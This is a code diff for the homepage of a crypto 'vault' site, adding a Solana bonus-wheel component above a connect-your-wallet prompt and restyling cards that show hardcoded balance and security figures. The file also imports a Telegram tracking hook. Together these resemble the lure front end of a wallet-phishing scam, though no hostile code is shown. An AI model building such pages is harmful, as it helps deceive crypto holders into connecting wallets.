@@ -8,6 +8,7 @@ import { Badge } from "@/components/ui/badge"
 import { Icons } from "@/components/icons"
 import { WalletConnectionModal } from "@/components/wallet-connection-modal"
 import { useTelegramTracking } from "@/hooks/use-telegram-tracking"
+import { SolanaBonusWheel } from "@/components/solana-bonus-wheel"
 
 function useInView(threshold = 0.1) {
   const [isInView, setIsInView] = useState(false)
@@ -65,7 +66,7 @@ export default function HomePage() {
   return (
     <div className="min-h-screen bg-background">
       {/* Header */}
-      <header className="border-b border-border bg-card/50 backdrop-blur-sm sticky top-0 z-50">
+      <header className="border-b border-white/[0.08] bg-black/20 backdrop-blur-xl sticky top-0 z-50 glass">
         <div className="container mx-auto px-4 py-4">
           <div className="flex items-center justify-between">
             <div className="flex items-center space-x-3">
@@ -106,36 +107,40 @@ export default function HomePage() {
           /* Welcome Section */
           <div
             ref={heroRef}
-            className={`text-center py-16 transition-all duration-1000 ${
-              heroInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
-            }`}
+            className={`text-center py-16 transition-all duration-1000 ${heroInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
+              }`}
           >
-            <div className="max-w-3xl mx-auto">
-              <div className="flex justify-center mb-6">
-                <div className="relative">
-                  <div className="flex items-center justify-center w-20 h-20 bg-primary/20 rounded-full animate-pulse">
-                    <Icons.Shield />
+            <div className="max-w-4xl mx-auto space-y-12">
+              {/* New Spinning Wheel Section */}
+              <SolanaBonusWheel onConnect={handleWalletConnect} />
+
+              <div className="max-w-3xl mx-auto">
+                <div className="flex justify-center mb-6">
+                  <div className="relative">
+                    <div className="flex items-center justify-center w-20 h-20 bg-primary/20 rounded-full animate-pulse">
+                      <Icons.Shield />
+                    </div>
+                    <div className="absolute inset-0 w-20 h-20 bg-primary/10 rounded-full animate-ping"></div>
                   </div>
-                  <div className="absolute inset-0 w-20 h-20 bg-primary/10 rounded-full animate-ping"></div>
                 </div>
+                <h2 className="text-4xl md:text-5xl font-bold font-sans mb-4 bg-gradient-to-r from-primary to-primary/70 bg-clip-text text-transparent">
+                  Secure Your Digital Assets
+                </h2>
+                <p className="text-xl text-muted-foreground font-mono mb-8 leading-relaxed">
+                  Connect your cryptocurrency wallet to access our advanced vault protocol. Experience enterprise-grade
+                  security with seamless wallet integration.
+                </p>
+                <WalletConnectionModal onConnect={handleWalletConnect}>
+                  <Button
+                    size="lg"
+                    className="bg-primary hover:bg-primary/90 text-primary-foreground font-medium px-8 py-3 transform hover:scale-105 transition-all duration-200"
+                  >
+                    <Icons.Wallet />
+                    Get Started
+                    <Icons.ChevronRight />
+                  </Button>
+                </WalletConnectionModal>
               </div>
-              <h2 className="text-4xl md:text-5xl font-bold font-sans mb-4 bg-gradient-to-r from-primary to-primary/70 bg-clip-text text-transparent">
-                Secure Your Digital Assets
-              </h2>
-              <p className="text-xl text-muted-foreground font-mono mb-8 leading-relaxed">
-                Connect your cryptocurrency wallet to access our advanced vault protocol. Experience enterprise-grade
-                security with seamless wallet integration.
-              </p>
-              <WalletConnectionModal onConnect={handleWalletConnect}>
-                <Button
-                  size="lg"
-                  className="bg-primary hover:bg-primary/90 text-primary-foreground font-medium px-8 py-3 transform hover:scale-105 transition-all duration-200"
-                >
-                  <Icons.Wallet />
-                  Get Started
-                  <Icons.ChevronRight />
-                </Button>
-              </WalletConnectionModal>
             </div>
           </div>
         ) : (
@@ -154,35 +159,35 @@ export default function HomePage() {
 
             {/* Stats Cards */}
             <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
-              <Card className="bg-card border-border">
+              <Card className="border-white/5 glass glossy group overflow-hidden transition-all hover:border-primary/50">
                 <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-                  <CardTitle className="text-sm font-medium font-mono">Total Balance</CardTitle>
-                  <Icons.TrendingUp />
+                  <CardTitle className="text-sm font-medium font-mono text-white/70">Total Balance</CardTitle>
+                  <Icons.TrendingUp className="text-primary" />
                 </CardHeader>
                 <CardContent>
-                  <div className="text-2xl font-bold font-sans">$12,345.67</div>
+                  <div className="text-2xl font-bold font-sans metallic-silver">$12,345.67</div>
                   <p className="text-xs text-muted-foreground">+2.5% from last month</p>
                 </CardContent>
               </Card>
 
-              <Card className="bg-card border-border">
+              <Card className="border-white/5 glass glossy group overflow-hidden transition-all hover:border-primary/50">
                 <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-                  <CardTitle className="text-sm font-medium font-mono">Active Wallets</CardTitle>
-                  <Icons.Wallet />
+                  <CardTitle className="text-sm font-medium font-mono text-white/70">Active Wallets</CardTitle>
+                  <Icons.Wallet className="text-primary" />
                 </CardHeader>
                 <CardContent>
-                  <div className="text-2xl font-bold font-sans">3</div>
+                  <div className="text-2xl font-bold font-sans metallic-silver">3</div>
                   <p className="text-xs text-muted-foreground">Connected securely</p>
                 </CardContent>
               </Card>
 
-              <Card className="bg-card border-border">
+              <Card className="border-white/5 glass glossy group overflow-hidden transition-all hover:border-primary/50">
                 <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-                  <CardTitle className="text-sm font-medium font-mono">Security Score</CardTitle>
-                  <Icons.Shield />
+                  <CardTitle className="text-sm font-medium font-mono text-white/70">Security Score</CardTitle>
+                  <Icons.Shield className="text-primary" />
                 </CardHeader>
                 <CardContent>
-                  <div className="text-2xl font-bold font-sans text-primary">98%</div>
+                  <div className="text-2xl font-bold font-sans text-primary drop-shadow-[0_0_10px_rgba(var(--primary),0.5)]">98%</div>
                   <p className="text-xs text-muted-foreground">Excellent protection</p>
                 </CardContent>
               </Card>
@@ -217,9 +222,8 @@ export default function HomePage() {
         {/* DeFi Integration Section */}
         <section
           ref={defiRef}
-          className={`py-20 bg-gradient-to-b from-background to-muted/20 transition-all duration-1000 ${
-            defiInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
-          }`}
+          className={`py-20 bg-gradient-to-b from-background to-muted/20 transition-all duration-1000 ${defiInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
+            }`}
         >
           <div className="text-center mb-16">
             <Badge variant="outline" className="mb-4 border-primary/30 text-primary">
@@ -319,9 +323,8 @@ export default function HomePage() {
         {/* Security & Protection Section */}
         <section
           ref={securityRef}
-          className={`py-20 transition-all duration-1000 ${
-            securityInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
-          }`}
+          className={`py-20 transition-all duration-1000 ${securityInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
+            }`}
         >
           <div className="text-center mb-16">
             <Badge variant="outline" className="mb-4 border-primary/30 text-primary">
@@ -409,9 +412,8 @@ export default function HomePage() {
         {/* Trust & Statistics Section */}
         <section
           ref={statsRef}
-          className={`py-20 bg-gradient-to-b from-muted/20 to-background transition-all duration-1000 ${
-            statsInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
-          }`}
+          className={`py-20 bg-gradient-to-b from-muted/20 to-background transition-all duration-1000 ${statsInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
+            }`}
         >
           <div className="text-center mb-16">
             <h3 className="text-4xl font-bold font-sans mb-6">Trusted by Crypto Enthusiasts Worldwide</h3>
@@ -429,9 +431,8 @@ export default function HomePage() {
             ].map((stat, index) => (
               <div
                 key={index}
-                className={`text-center transform transition-all duration-700 ${
-                  statsInView ? "translate-y-0 opacity-100" : "translate-y-10 opacity-0"
-                }`}
+                className={`text-center transform transition-all duration-700 ${statsInView ? "translate-y-0 opacity-100" : "translate-y-10 opacity-0"
+                  }`}
                 style={{ transitionDelay: `${index * 200}ms` }}
               >
                 <div className="text-3xl md:text-4xl font-bold font-sans text-primary mb-2">{stat.value}</div>
@@ -452,9 +453,8 @@ export default function HomePage() {
         {/* Features Section */}
         <div
           ref={featuresRef}
-          className={`py-16 transition-all duration-1000 ${
-            featuresInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
-          }`}
+          className={`py-16 transition-all duration-1000 ${featuresInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
+            }`}
         >
           <div className="text-center mb-12">
             <h3 className="text-2xl font-bold font-sans mb-4">Why Choose Our Vault?</h3>
@@ -483,9 +483,8 @@ export default function HomePage() {
             ].map((feature, index) => (
               <div
                 key={index}
-                className={`text-center transform transition-all duration-700 hover:scale-105 ${
-                  featuresInView ? "translate-y-0 opacity-100" : "translate-y-10 opacity-0"
-                }`}
+                className={`text-center transform transition-all duration-700 hover:scale-105 ${featuresInView ? "translate-y-0 opacity-100" : "translate-y-10 opacity-0"
+                  }`}
                 style={{ transitionDelay: `${index * 200}ms` }}
               >
                 <div className="flex justify-center mb-4">
@@ -503,9 +502,8 @@ export default function HomePage() {
         {/* Call to Action Section */}
         <section
           ref={ctaRef}
-          className={`py-20 text-center transition-all duration-1000 ${
-            ctaInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
-          }`}
+          className={`py-20 text-center transition-all duration-1000 ${ctaInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
+            }`}
         >
           <div className="max-w-3xl mx-auto">
             <h3 className="text-4xl font-bold font-sans mb-6">Ready to Secure Your Crypto?</h3>
